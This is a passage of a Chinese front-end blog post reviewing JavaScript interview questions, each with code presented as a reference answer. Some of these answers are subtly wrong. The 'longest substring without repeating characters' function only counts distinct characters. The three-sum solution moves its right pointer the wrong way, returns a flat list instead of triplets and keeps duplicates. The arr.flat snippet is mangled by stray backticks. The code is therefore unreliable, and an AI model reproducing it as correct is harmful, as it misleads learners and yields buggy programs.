    num_f <span class="token operator">=</span> <span class="token constant">N</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> y<span class="token punctuation">)</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> y<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token constant">N</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        num_f <span class="token operator">+=</span> <span class="token string">','</span> <span class="token operator">+</span> <span class="token constant">N</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>i<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>num_s <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        num_f <span class="token operator">+=</span> <span class="token string">'.'</span> <span class="token operator">+</span> num_s
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> num_f
<span class="token punctuation">&#125;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">change</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//12,345,678.12</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h4 id="写一个判断是否是空对象的函数"><a href="#写一个判断是否是空对象的函数" class="headerlink" title="写一个判断是否是空对象的函数"></a>写一个判断是否是空对象的函数</h4><p><strong>参考答案：</strong></p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>
        value <span class="token operator">===</span> <span class="token keyword">null</span> <span class="token operator">||</span> value <span class="token operator">===</span> <span class="token keyword">undefined</span> <span class="token operator">||</span>
        <span class="token punctuation">(</span><span class="token keyword">typeof</span> value <span class="token operator">===</span> <span class="token string">'object'</span> <span class="token operator">&amp;&amp;</span> Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> 
    <span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h4 id="给定一个字符串，请你找出其中不含有重复字符的-最长子串-的长度"><a href="#给定一个字符串，请你找出其中不含有重复字符的-最长子串-的长度" class="headerlink" title="给定一个字符串，请你找出其中不含有重复字符的 最长子串 的长度"></a><strong>给定一个字符串，请你找出其中不含有重复字符的 最长子串 的长度</strong></h4><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">countWord</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">let</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> str<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>arr<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      count<span class="token operator">++</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> count<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">let</span> str <span class="token operator">=</span> <span class="token string">"qqdwqcasdffdghjsbjhbm"</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">countWord</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h4 id="三数之和"><a href="#三数之和" class="headerlink" title="三数之和"></a>三数之和</h4><p><strong>参考答案：</strong></p>
<p>题目描述</p>
<p>给定一个包含 n 个整数的数组 nums，判断 nums 中是否存在三个元素 a，b，c ，使得 a + b + c &#x3D; 0 ？找出所有满足条件且不重复的三元组。</p>
<p>注意：答案中不可以包含重复的三元组。</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">//例如, 给定数组 nums = [-1, 0, 1, 2, -1, -4]，</span>
<span class="token comment">//满足要求的三元组集合为：</span>
<span class="token punctuation">[</span>
  <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span>
<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>





<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> nums <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">getNum</span><span class="token punctuation">(</span><span class="token parameter">nums</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">let</span> ans <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  nums<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token operator">=></span> a <span class="token operator">-</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">let</span> l <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> r <span class="token operator">=</span> nums<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>l <span class="token operator">&lt;</span> r<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">let</span> sum <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> nums<span class="token punctuation">[</span>l<span class="token punctuation">]</span> <span class="token operator">+</span> nums<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>sum <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        ans<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        l<span class="token operator">++</span><span class="token punctuation">;</span>
        r<span class="token operator">++</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>sum <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        r<span class="token operator">--</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        l<span class="token operator">++</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> ans<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">getNum</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h4 id="js判断数据类型"><a href="#js判断数据类型" class="headerlink" title="js判断数据类型"></a>js判断数据类型</h4><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">getTypeOf</span><span class="token punctuation">(</span><span class="token parameter">x</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> <span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">'object'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> <span class="token keyword">typeof</span> <span class="token punctuation">(</span>x<span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">let</span> test <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">'kif'</span><span class="token punctuation">]</span>
<span class="token keyword">let</span> x
<span class="token keyword">for</span> <span class="token punctuation">(</span>x <span class="token keyword">in</span> test<span class="token punctuation">)</span> <span class="token punctuation">(</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">getTypeOf</span><span class="token punctuation">(</span>test<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h4 id="arr-flat-Infinity"><a href="#arr-flat-Infinity" class="headerlink" title="arr.flat(Infinity)"></a><strong>arr.flat(Infinity)</strong></h4><p>flat作为ES6的新特性，只要调用该方法便可以简单快速实现数组的扁平化，使用起来确实很容易上手(可以说是0门槛)，但是只会这个方法是没有办法得到面试官的青睐的！</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token template-punctuation string">`</span></span><span class="token comment">// 1. flat自动展开``let arr1 = arr.flat(Infinity);``console.log(arr1); ``// [ 1, 2, 3, 4, 5 ]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://kifimg.oss-cn-beijing.aliyuncs.com/imgforteachingdemo/20201127203438.png" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://kifimg.oss-cn-beijing.aliyuncs.com/imgforteachingdemo/20201127203438.png" title="头像" alt="头像"></a><div class="post-copyright__author_name">kif</div><div class="post-copyright__author_desc">梅虽逊雪三分白，雪却输梅一段香</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="https://wkif.gitee.io/post/c03c.html">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('https://wkif.gitee.io/post/c03c.html')">重温前端-js篇</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="https://wkif.gitee.io/post/c03c.html"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=重温前端-js篇&amp;url=https://wkif.gitee.io/post/c03c.html&amp;pic=https://kifimg.oss-cn-beijing.aliyuncs.com/project/202204241829907.jpg" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="rm.copyPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://wkif.gitee.io" target="_blank">Kifroom</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/javascript/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>javascript<span class="tagsPageCount">7</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://kiftravel.oss-cn-beijing.aliyuncs.com/img/202308280943672.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/4e3b.html"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">vue部分知识点</div></div></a></div><div class="next-post pull-right"><a href="/post/cc32.html"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://kifimg.oss-cn-beijing.aliyuncs.com/project/202204241828510.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">重温前端-css篇</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/post/23df.html" title="JS数组reduce()方法详解及高级技巧"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://kifimg.oss-cn-beijing.aliyuncs.com/imgforhexo/20201202142640.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2022-05-23</div><div class="title">JS数组reduce()方法详解及高级技巧</div></div></a></div><div><a href="/post/4428.html" title="Javascript字符串处理"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://kifimg.oss-cn-beijing.aliyuncs.com/imgforhexo/20201202142640.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2021-01-10</div><div class="title">Javascript字符串处理</div></div></a></div><div><a href="/post/4016.html" title="javascript系列学习笔记-this"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://kifimg.oss-cn-beijing.aliyuncs.com/img/202211081854956.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2022-10-14</div><div class="title">javascript系列学习笔记-this</div></div></a></div><div><a href="/post/e4e8.html" title="js 数组详细操作方法及解析"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://kifimg.oss-cn-beijing.aliyuncs.com/img/202301101122188.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-01-10</div><div class="title">js 数组详细操作方法及解析</div></div></a></div><div><a href="/post/a426.html" title="js中截取字符串的三个方法 substring()、substr()、slice()"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://kifimg.oss-cn-beijing.aliyuncs.com/project/202207282315497.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2022-07-28</div><div class="title">js中截取字符串的三个方法 substring()、substr()、slice()</div></div></a></div><div><a href="/post/5478.html" title="js发布订阅"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://kifimg.oss-cn-beijing.aliyuncs.com/project/202206101955855.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2022-06-10</div><div class="title">js发布订阅</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://kifimg.oss-cn-beijing.aliyuncs.com/imgforteachingdemo/20201127203438.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" ait="status"/></div></div><div class="author-info__description"></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/"><h1 class="author-info__name">kif</h1><div class="author-info__desc">梅虽逊雪三分白，雪却输梅一段香</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/wkif" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a></div></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来看我的博客鸭~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Javascript"><span class="toc-number">1.</span> <span class="toc-text">Javascript</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81JS%E4%B8%AD%E7%9A%84instanceof%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-number">1.1.</span> <span class="toc-text">1、JS中的instanceof运算符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E6%8E%92%E5%BA%8F"><span class="toc-number">1.2.</span> <span class="toc-text">2、排序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81JS%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%A7%E5%86%99%E5%92%8C%E5%B0%8F%E5%86%99%E4%B9%8B%E9%97%B4%E7%9A%84%E8%BD%AC%E6%8D%A2"><span class="toc-number">1.3.</span> <span class="toc-text">3、JS字符串大写和小写之间的转换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81javascript%E5%A6%82%E4%BD%95%E5%88%A0%E9%99%A4%E6%8C%87%E5%AE%9A%E6%95%B0%E7%BB%84%E5%85%83%E7%B4%A0"><span class="toc-number">1.4.</span> <span class="toc-text">4、javascript如何删除指定数组元素</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E3%80%81%E6%95%B0%E7%BB%84%E6%96%B9%E6%B3%95"><span class="toc-number">1.5.</span> <span class="toc-text">5、数组方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E7%BB%84%E6%96%B9%E6%B3%95%E6%A6%82%E6%8B%AC"><span class="toc-number">1.5.1.</span> <span class="toc-text">数组方法概括</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6%E3%80%81%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.6.</span> <span class="toc-text">6、对象</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Number-%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.6.1.</span> <span class="toc-text">Number 对象</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%B9%E8%B1%A1%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">1.6.2.</span> <span class="toc-text">对象字符串</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%B9%E8%B1%A1%E5%B1%9E%E6%80%A7%E9%81%8D%E5%8E%86%EF%BC%9A"><span class="toc-number">1.6.3.</span> <span class="toc-text">对象属性遍历：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E5%B1%9E%E6%80%A7"><span class="toc-number">1.6.4.</span> <span class="toc-text">添加属性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A0%E9%99%A4%E5%AF%B9%E8%B1%A1%E5%B1%9E%E6%80%A7"><span class="toc-number">1.6.5.</span> <span class="toc-text">删除对象属性</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7%E3%80%81%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">1.7.</span> <span class="toc-text">7、字符串</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#String-%E5%AF%B9%E8%B1%A1%E4%B8%AD%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">1.7.1.</span> <span class="toc-text">String 对象中的方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%BB%E9%99%A4%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%B7%A6%E5%8F%B3%E4%B8%A4%E8%BE%B9%E7%9A%84%E7%A9%BA%E6%A0%BC"><span class="toc-number">1.7.2.</span> <span class="toc-text">去除字符串左右两边的空格</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8%E3%80%81js-%E6%97%B6%E9%97%B4%E4%B8%8E%E6%97%B6%E9%97%B4%E6%88%B3%E7%9A%84%E8%BD%AC%E6%8D%A2"><span class="toc-number">1.8.</span> <span class="toc-text">8、js 时间与时间戳的转换</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E8%BD%AC%E6%97%B6%E9%97%B4%E6%88%B3%EF%BC%9A"><span class="toc-number">1.8.1.</span> <span class="toc-text">时间转时间戳：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E6%88%B3%E8%BD%AC%E6%97%B6%E9%97%B4"><span class="toc-number">1.8.2.</span> <span class="toc-text">时间戳转时间</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9%E3%80%81Arguments-%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.9.</span> <span class="toc-text">9、Arguments 对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 